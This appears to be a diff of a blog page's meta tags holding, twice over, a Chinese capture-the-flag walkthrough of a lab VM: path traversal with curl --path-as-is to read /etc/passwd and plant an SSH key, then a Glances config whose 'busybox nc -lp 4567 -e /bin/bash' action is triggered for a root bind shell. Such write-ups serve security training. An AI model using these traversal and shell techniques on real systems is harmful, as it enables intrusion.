@@ -11,13 +11,479 @@
 
 ## 1.1 主机发现与端口扫描
 
-首先，在VMware NAT网络环境下，使用`arp-scan`进行主机发现，确定目标靶机的IP地址。">
+首先，在VMware NAT网络环境下，使用`arp-scan`进行主机发现，确定目标靶机的IP地址。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ sudo arp-scan -l
+...
+192.168.205.156 08:00:27:f9:af:5d       PCS Systemtechnik GmbH
+...
+```
+
+发现目标主机IP为 `192.168.205.156`。
+
+接着，使用`nmap`对目标主机进行全端口扫描，以识别所有开放的服务。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -p0-65535 192.168.205.156
+...
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+1045/tcp  open  fpitp
+MAC Address: 08:00:27:F9:AF:5D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+扫描结果显示，目标开放了多个端口，包括SSH(22)、HTTP(80)、SMB(139, 445)服务，以及一个非常规的`1045`端口。
+
+## 1.2 服务版本探测
+
+对非标准端口`1045`进行详细的服务版本探测和脚本扫描，以了解其运行的应用。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -p1045 -sC -sV 192.168.205.156
+...
+PORT     STATE SERVICE VERSION
+1045/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.9.2)
+|_http-server-header: Werkzeug/3.1.3 Python/3.9.2
+|_http-title: 404 Not Found
+```
+
+`1045`端口上运行的是一个基于`Python Werkzeug`的HTTP服务。直接访问时返回404，这表明我们需要寻找正确的API路径或Web端点。
+
+## 1.3 SMB信息枚举
+
+由于目标开放了SMB服务，使用`enum4linux-ng`进行详细枚举，寻找可利用的信息，如共享目录和匿名访问权限。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ enum4linux-ng -A 192.168.205.156
+...
+ =========================================
+|    Shares via RPC on 192.168.205.156    |
+ =========================================
+[*] Enumerating shares
+[+] Found 3 share(s):
+...
+user_files:
+  comment: User Files Share
+  type: Disk
+...
+[*] Testing share user_files
+[+] Mapping: OK, Listing: OK
+```
+
+枚举发现了一个名为 `user_files` 的共享目录，并且允许匿名访问和列出文件。尝试连接后发现目录为空，暂时没有发现可利用的文件。
+
+# 二、Web服务渗透与漏洞利用
+
+## 2.1 Web信息探索
+
+访问`80`端口的HTTP服务，发现是一个“名字Gay指数计算器”的Web应用。查看网页源代码，发现一个注释提示，这可能是后续认证的关键凭证。
+
+```html
+<!-- xixilake-session-secure-2025 -->
+```
+
+这个注释 `xixilake-session-secure-2025` 看起来像一个密钥或Session令牌，我们将其记录下来以备后用。
+
+## 2.2 API接口探索与突破
+
+转向`1045`端口的Web服务，对其进行目录爆破发现了`/api`路径，并进一步在`/api`下找到了`/api/health`端点。访问该端点获取了API的结构信息，其中最关键的是指明了用于文件操作的路径：`/api/files/`。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.205.156:1045/api/health
+{'available_endpoints':{'/api':'API information','/api/files/':'File operations',...}}
+```
+
+结合之前发现的令牌，我们推断它可能用作`X-Session-Token`头进行身份认证。首先，在本地创建一个包含SSH公钥的文件`authorized_keys`，然后尝试利用此令牌上传该文件。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X PUT -H 'X-Session-Token: xixilake-session-secure-2025' -T authorized_keys http://192.168.205.156:1045/api/files/authorized_keys
+{'message':'File authorized_keys uploaded successfully'}
+```
+
+上传成功！这确认了我们拥有通过API向服务器特定目录写入文件的能力。
+
+## 2.3 路径遍历漏洞的发现与利用
+
+既然可以操作文件，下一步就是测试是否存在路径遍历（Path Traversal）漏洞。我们尝试通过构造 `../` 序列来读取位于Web目录之外的 `/etc/passwd` 文件。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl --path-as-is 'http://192.168.205.156:1045/api/files/../../../etc/passwd' -H 'X-Session-Token: xixilake-session-secure-2025'
+root:x:0:0:root:/root:/bin/bash
+...
+ll:x:1001:1001::/home/ll:/bin/bash
+```
+
+成功读取！这证明了漏洞的存在，并且我们可以通过此漏洞获取一个名为`ll`的用户信息。
+
+### **技术剖析：客户端路径规范化与`--path-as-is`的重要性**
+
+在这里，`--path-as-is`标志是本次漏洞利用成功的**决定性因素**。若缺少此标志，无论是使用浏览器还是默认的`curl`命令，攻击都会失败。其根本原因在于**客户端路径规范化 (Client-Side Path Normalization)**。
+
+1.  **为什么浏览器和默认`curl`会失败？**
+    当你在浏览器地址栏或标准的`curl`命令中输入包含 `../` 的URL时，客户端应用（浏览器或curl程序）会在发送HTTP请求**之前**，就“智能地”对路径进行清理和规范化。
+    *   **输入路径**: `/api/files/../../../etc/passwd`
+    *   **客户端规范化后**: `/etc/passwd`
+        最终发送到服务器的请求路径是 `/etc/passwd`，这个路径不符合应用的API路由规则，因此无法触发漏洞，导致404错误。
+
+2.  **为什么`--path-as-is`能够成功？**
+    此参数的作用是告诉`curl`**关闭其默认的路径规范化功能**。它会将URL中的路径部分 `../../../etc/passwd` 原封不动地发送给服务器。由于服务端的Python应用代码存在缺陷，没有对接收到的路径进行安全处理，因此直接拼接并执行了文件操作，最终导致了目录遍历漏洞的成功利用。
+
+利用此漏洞，我们使用`MOVE`方法将之前上传的`authorized_keys`文件移动到目标用户`ll`的`.ssh`目录下。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X MOVE -H 'X-Session-Token: xixilake-session-secure-2025' -H 'Destination: ../../../home/ll/.ssh/authorized_keys' http://192.168.205.156:1045/api/files/authorized_keys
+{'message':'File moved to ../../../home/ll/.ssh/authorized_keys'}
+```
+
+文件移动成功。现在我们可以通过SSH免密登录`ll`用户。
+
+# 三、权限提升
+
+## 3.1 获取初始Shell
+
+利用已写入的SSH公钥，登录目标主机，获取低权限shell。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ ssh ll@192.168.205.156
+...
+ll@104567:~$ id
+uid=1001(ll) gid=1001(ll) groups=1001(ll)
+```
+
+成功获取了`ll`用户的shell。
+
+## 3.2 Sudo权限分析
+
+检查当前用户的`sudo`权限，寻找提权线索。
+
+```bash
+ll@104567:~$ sudo -l
+...
+User ll may run the following commands on 104567:
+    (ALL : ALL) NOPASSWD: /usr/bin/toilet
+```
+
+发现`ll`用户可以免密码以root权限执行`/usr/bin/toilet`命令，这个命令是兔子洞。
+
+## 3.3 发现高权限服务：Glances
+
+在目标主机上，使用`ss -tnlp`查看网络连接情况，寻找可能由高权限用户启动的、未被外网扫描发现的服务。
+
+```bash
+ll@104567:~$ ss -tnlp
+State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port
+...
+LISTEN   0        128              0.0.0.0:61208          0.0.0.0:*
+...
+```
+
+发现了一个新的`61208`端口正在监听。回到Kali，扫描该端口，确认其运行着一个`Glances`系统监控服务，并且通过目录扫描和访问`/openapi.json`，确认这是一个API版本为V4的Glances服务。
+
+## 3.4 配置文件信息泄露与命令执行漏洞
+
+根据API文档，`/api/4/config`端点存在信息泄露漏洞，可以读取Glances的配置文件。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.205.156:61208/api/4/config | jq
+{
+  'fs': {
+    'warning': '80',
+    'warning_action': 'busybox nc -lp 4567 -e /bin/bash',
+    'careful': '50',
+    'critical': '90'
+  },
+...
+}
+```
+
+配置文件中存在一个致命的配置项`warning_action`。当文件系统使用率达到80%时，由于Glances服务是以root权限运行的，系统会以**root权限**执行预设命令`busybox nc -lp 4567 -e /bin/bash`，从而开启一个监听在4567端口的绑定型shell。
+
+## 3.5 触发漏洞并获取Root Shell
+
+我们只需在目标机上创建一个大文件，使磁盘占用率超过80%即可触发该动作。根据主机信息，创建一个21G的文件足以触发。
+
+在`ll`用户的shell中执行：
+
+```bash
+ll@104567:~$ dd if=/dev/zero of=/tmp/bigfile bs=1G count=21
+22548578304 bytes (23 GB, 21 GiB) copied...
+```
+
+文件创建完成后，立即从Kali连接目标机开启的4567端口。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc 192.168.205.156 4567
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+成功连接并获取了root shell。
+
+# 四、获取Flag
+
+在root shell中，读取所有flag文件。
+
+```bash
+cat /root/root.txt /home/ll/user.txt
+flag{root-f526a6c9f285aa9d001a459b42ef3035}
+flag{user-bc3c292e432690a9a0444bb46a559061}
+```
+
+成功获取所有Flag，渗透测试完成。sentence">
 <meta property="og:title" content="内部_ll104567">
 <meta property="og:description" content="# 一、信息收集
 
 ## 1.1 主机发现与端口扫描
 
-首先，在VMware NAT网络环境下，使用`arp-scan`进行主机发现，确定目标靶机的IP地址。">
+首先，在VMware NAT网络环境下，使用`arp-scan`进行主机发现，确定目标靶机的IP地址。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ sudo arp-scan -l
+...
+192.168.205.156 08:00:27:f9:af:5d       PCS Systemtechnik GmbH
+...
+```
+
+发现目标主机IP为 `192.168.205.156`。
+
+接着，使用`nmap`对目标主机进行全端口扫描，以识别所有开放的服务。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -p0-65535 192.168.205.156
+...
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+1045/tcp  open  fpitp
+MAC Address: 08:00:27:F9:AF:5D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+扫描结果显示，目标开放了多个端口，包括SSH(22)、HTTP(80)、SMB(139, 445)服务，以及一个非常规的`1045`端口。
+
+## 1.2 服务版本探测
+
+对非标准端口`1045`进行详细的服务版本探测和脚本扫描，以了解其运行的应用。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -p1045 -sC -sV 192.168.205.156
+...
+PORT     STATE SERVICE VERSION
+1045/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.9.2)
+|_http-server-header: Werkzeug/3.1.3 Python/3.9.2
+|_http-title: 404 Not Found
+```
+
+`1045`端口上运行的是一个基于`Python Werkzeug`的HTTP服务。直接访问时返回404，这表明我们需要寻找正确的API路径或Web端点。
+
+## 1.3 SMB信息枚举
+
+由于目标开放了SMB服务，使用`enum4linux-ng`进行详细枚举，寻找可利用的信息，如共享目录和匿名访问权限。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ enum4linux-ng -A 192.168.205.156
+...
+ =========================================
+|    Shares via RPC on 192.168.205.156    |
+ =========================================
+[*] Enumerating shares
+[+] Found 3 share(s):
+...
+user_files:
+  comment: User Files Share
+  type: Disk
+...
+[*] Testing share user_files
+[+] Mapping: OK, Listing: OK
+```
+
+枚举发现了一个名为 `user_files` 的共享目录，并且允许匿名访问和列出文件。尝试连接后发现目录为空，暂时没有发现可利用的文件。
+
+# 二、Web服务渗透与漏洞利用
+
+## 2.1 Web信息探索
+
+访问`80`端口的HTTP服务，发现是一个“名字Gay指数计算器”的Web应用。查看网页源代码，发现一个注释提示，这可能是后续认证的关键凭证。
+
+```html
+<!-- xixilake-session-secure-2025 -->
+```
+
+这个注释 `xixilake-session-secure-2025` 看起来像一个密钥或Session令牌，我们将其记录下来以备后用。
+
+## 2.2 API接口探索与突破
+
+转向`1045`端口的Web服务，对其进行目录爆破发现了`/api`路径，并进一步在`/api`下找到了`/api/health`端点。访问该端点获取了API的结构信息，其中最关键的是指明了用于文件操作的路径：`/api/files/`。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.205.156:1045/api/health
+{'available_endpoints':{'/api':'API information','/api/files/':'File operations',...}}
+```
+
+结合之前发现的令牌，我们推断它可能用作`X-Session-Token`头进行身份认证。首先，在本地创建一个包含SSH公钥的文件`authorized_keys`，然后尝试利用此令牌上传该文件。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X PUT -H 'X-Session-Token: xixilake-session-secure-2025' -T authorized_keys http://192.168.205.156:1045/api/files/authorized_keys
+{'message':'File authorized_keys uploaded successfully'}
+```
+
+上传成功！这确认了我们拥有通过API向服务器特定目录写入文件的能力。
+
+## 2.3 路径遍历漏洞的发现与利用
+
+既然可以操作文件，下一步就是测试是否存在路径遍历（Path Traversal）漏洞。我们尝试通过构造 `../` 序列来读取位于Web目录之外的 `/etc/passwd` 文件。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl --path-as-is 'http://192.168.205.156:1045/api/files/../../../etc/passwd' -H 'X-Session-Token: xixilake-session-secure-2025'
+root:x:0:0:root:/root:/bin/bash
+...
+ll:x:1001:1001::/home/ll:/bin/bash
+```
+
+成功读取！这证明了漏洞的存在，并且我们可以通过此漏洞获取一个名为`ll`的用户信息。
+
+### **技术剖析：客户端路径规范化与`--path-as-is`的重要性**
+
+在这里，`--path-as-is`标志是本次漏洞利用成功的**决定性因素**。若缺少此标志，无论是使用浏览器还是默认的`curl`命令，攻击都会失败。其根本原因在于**客户端路径规范化 (Client-Side Path Normalization)**。
+
+1.  **为什么浏览器和默认`curl`会失败？**
+    当你在浏览器地址栏或标准的`curl`命令中输入包含 `../` 的URL时，客户端应用（浏览器或curl程序）会在发送HTTP请求**之前**，就“智能地”对路径进行清理和规范化。
+    *   **输入路径**: `/api/files/../../../etc/passwd`
+    *   **客户端规范化后**: `/etc/passwd`
+        最终发送到服务器的请求路径是 `/etc/passwd`，这个路径不符合应用的API路由规则，因此无法触发漏洞，导致404错误。
+
+2.  **为什么`--path-as-is`能够成功？**
+    此参数的作用是告诉`curl`**关闭其默认的路径规范化功能**。它会将URL中的路径部分 `../../../etc/passwd` 原封不动地发送给服务器。由于服务端的Python应用代码存在缺陷，没有对接收到的路径进行安全处理，因此直接拼接并执行了文件操作，最终导致了目录遍历漏洞的成功利用。
+
+利用此漏洞，我们使用`MOVE`方法将之前上传的`authorized_keys`文件移动到目标用户`ll`的`.ssh`目录下。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X MOVE -H 'X-Session-Token: xixilake-session-secure-2025' -H 'Destination: ../../../home/ll/.ssh/authorized_keys' http://192.168.205.156:1045/api/files/authorized_keys
+{'message':'File moved to ../../../home/ll/.ssh/authorized_keys'}
+```
+
+文件移动成功。现在我们可以通过SSH免密登录`ll`用户。
+
+# 三、权限提升
+
+## 3.1 获取初始Shell
+
+利用已写入的SSH公钥，登录目标主机，获取低权限shell。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ ssh ll@192.168.205.156
+...
+ll@104567:~$ id
+uid=1001(ll) gid=1001(ll) groups=1001(ll)
+```
+
+成功获取了`ll`用户的shell。
+
+## 3.2 Sudo权限分析
+
+检查当前用户的`sudo`权限，寻找提权线索。
+
+```bash
+ll@104567:~$ sudo -l
+...
+User ll may run the following commands on 104567:
+    (ALL : ALL) NOPASSWD: /usr/bin/toilet
+```
+
+发现`ll`用户可以免密码以root权限执行`/usr/bin/toilet`命令，这个命令是兔子洞。
+
+## 3.3 发现高权限服务：Glances
+
+在目标主机上，使用`ss -tnlp`查看网络连接情况，寻找可能由高权限用户启动的、未被外网扫描发现的服务。
+
+```bash
+ll@104567:~$ ss -tnlp
+State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port
+...
+LISTEN   0        128              0.0.0.0:61208          0.0.0.0:*
+...
+```
+
+发现了一个新的`61208`端口正在监听。回到Kali，扫描该端口，确认其运行着一个`Glances`系统监控服务，并且通过目录扫描和访问`/openapi.json`，确认这是一个API版本为V4的Glances服务。
+
+## 3.4 配置文件信息泄露与命令执行漏洞
+
+根据API文档，`/api/4/config`端点存在信息泄露漏洞，可以读取Glances的配置文件。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.205.156:61208/api/4/config | jq
+{
+  'fs': {
+    'warning': '80',
+    'warning_action': 'busybox nc -lp 4567 -e /bin/bash',
+    'careful': '50',
+    'critical': '90'
+  },
+...
+}
+```
+
+配置文件中存在一个致命的配置项`warning_action`。当文件系统使用率达到80%时，由于Glances服务是以root权限运行的，系统会以**root权限**执行预设命令`busybox nc -lp 4567 -e /bin/bash`，从而开启一个监听在4567端口的绑定型shell。
+
+## 3.5 触发漏洞并获取Root Shell
+
+我们只需在目标机上创建一个大文件，使磁盘占用率超过80%即可触发该动作。根据主机信息，创建一个21G的文件足以触发。
+
+在`ll`用户的shell中执行：
+
+```bash
+ll@104567:~$ dd if=/dev/zero of=/tmp/bigfile bs=1G count=21
+22548578304 bytes (23 GB, 21 GiB) copied...
+```
+
+文件创建完成后，立即从Kali连接目标机开启的4567端口。
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc 192.168.205.156 4567
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+成功连接并获取了root shell。
+
+# 四、获取Flag
+
+在root shell中，读取所有flag文件。
+
+```bash
+cat /root/root.txt /home/ll/user.txt
+flag{root-f526a6c9f285aa9d001a459b42ef3035}
+flag{user-bc3c292e432690a9a0444bb46a559061}
+```
+
+成功获取所有Flag，渗透测试完成。sentence">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_ll104567.html">
 <meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
